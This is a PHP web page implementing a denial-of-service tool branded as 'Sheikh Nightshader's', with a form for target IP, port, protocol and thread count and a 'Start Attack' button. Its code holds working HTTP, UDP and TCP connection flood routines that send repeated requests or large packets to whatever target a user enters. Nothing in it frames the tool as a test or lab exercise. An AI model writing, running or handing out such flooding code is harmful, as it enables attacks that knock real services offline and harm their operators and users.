<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sheikh Nightshader's Web-Based DoS Tool</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            background-color: black;
            color: red;
        }
        .form-control {
            background-color: green;
            color: black;
        }
        .alert {
            color: red;
            background-color: black;
        }
    </style>
</head>
<body>
    <div class="container mt-5">
        <h2 class="text-center">Sheikh Nightshader's Web-Based DoS Tool</h2>

        <form method="POST" action="">
            <div class="form-group">
                <label for="target">Target IP:</label>
                <input type="text" class="form-control" id="target" name="target" required>
            </div>
            <div class="form-group">
                <label for="port">Port:</label>
                <input type="number" class="form-control" id="port" name="port" required>
            </div>
            <div class="form-group">
                <label for="protocol">Protocol:</label>
                <select class="form-control" id="protocol" name="protocol" required>
                    <option value="HTTP">HTTP</option>
                    <option value="UDP">UDP</option>
                    <option value="TCP">TCP</option>
                </select>
            </div>
            <div class="form-group">
                <label for="threads">Threads:</label>
                <input type="number" class="form-control" id="threads" name="threads" required>
            </div>
            <button type="submit" name="start" class="btn btn-danger btn-block">Start Attack</button>
            <button type="submit" name="stop" class="btn btn-warning btn-block">Stop Attack</button>
        </form>

        <div id="status" class="mt-3">
            <?php
                session_start();

                if (isset($_POST['start'])) {
                    $target = escapeshellcmd($_POST['target']);
                    $port = intval($_POST['port']);
                    $protocol = escapeshellcmd($_POST['protocol']);
                    $threads = escapeshellcmd($_POST['threads']);

                    $_SESSION['target'] = $target;
                    $_SESSION['port'] = $port;
                    $_SESSION['protocol'] = $protocol;
                    $_SESSION['threads'] = $threads;
                    $_SESSION['packet_count'] = 0;

                    echo '<div class="alert">';
                    echo 'Attack started on ' . $target . ':' . $port . ' using ' . $protocol . ' with ' . $threads . ' threads by Sheikh Nightshader.';
                    echo '</div>';

                    flood($target, $port, $protocol, $threads);
                }

                if (isset($_POST['stop'])) {
                    unset($_SESSION['target']);
                    unset($_SESSION['port']);
                    unset($_SESSION['protocol']);
                    unset($_SESSION['threads']);
                    unset($_SESSION['packet_count']);

                    echo '<div class="alert alert-info">Attack stopped.</div>';
                }

                function flood($target, $port, $protocol, $threads) {
                    if ($protocol === 'HTTP') {
                        http_flood($target, $port, $threads);
                    } elseif ($protocol === 'UDP') {
                        udp_flood($target, $port, $threads);
                    } elseif ($protocol === 'TCP') {
                        tcp_syn_flood($target, $port, $threads);
                    }
                }

                function http_flood($target, $port, $threads) {
                    $requests_per_thread = 10;
                    $user_agents = [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15",
                        "Mozilla/5.0 (Linux; Android 10; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                    ];

                    for ($i = 0; $i < $threads; $i++) {
                        for ($j = 0; $j < $requests_per_thread; $j++) {
                            $fp = fsockopen($target, $port, $errno, $errstr, 30);
                            if ($fp) {
                                $user_agent = $user_agents[array_rand($user_agents)];

                                $headers = [
                                    "GET / HTTP/1.1",
                                    "Host: $target",
                                    "User-Agent: $user_agent",
                                    "Connection: Close",
                                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                    "Accept-Language: en-US,en;q=0.5",
                                    "DNT: 1",
                                    "Upgrade-Insecure-Requests: 1"
                                ];

                                $out = implode("\r\n", $headers) . "\r\n\r\n";
                                fwrite($fp, $out);
                                fclose($fp);
                                $_SESSION['packet_count']++;
                            }
                        }
                    }
                }

                function udp_flood($target, $port, $threads) {
                    $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
                    $packet = str_repeat("X", 65507);
                    $requests_per_thread = 10;
                    for ($i = 0; $i < $threads; $i++) {
                        for ($j = 0; $j < $requests_per_thread; $j++) {
                            socket_sendto($sock, $packet, strlen($packet), 0, $target, $port);
                            $_SESSION['packet_count']++;
                        }
                    }
                    socket_close($sock);
                }

                function tcp_syn_flood($target, $port, $threads) {
                    $requests_per_thread = 10;
                    for ($i = 0; $i < $threads; $i++) {
                        for ($j = 0; $j < $requests_per_thread; $j++) {
                            $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                            if ($sock === false) {
                                continue;
                            }
                            socket_connect($sock, $target, $port);
                            socket_close($sock);
                            $_SESSION['packet_count']++;
                        }
                    }
                }
            ?>
        </div>

        <div class="alert alert-secondary" id="packetCount">
            Packets sent: <?php echo isset($_SESSION['packet_count']) ? $_SESSION['packet_count'] : 0; ?>
        </div>
    </div>

    <script>
        function updatePacketCount() {
            $.ajax({
                url: 'get_packet_count.php',
                method: 'GET',
                success: function(data) {
                    $('#packetCount').html('Packets sent: ' + data);
                }
            });
        }

        setInterval(updatePacketCount, 1000);
    </script>
</body>
</html>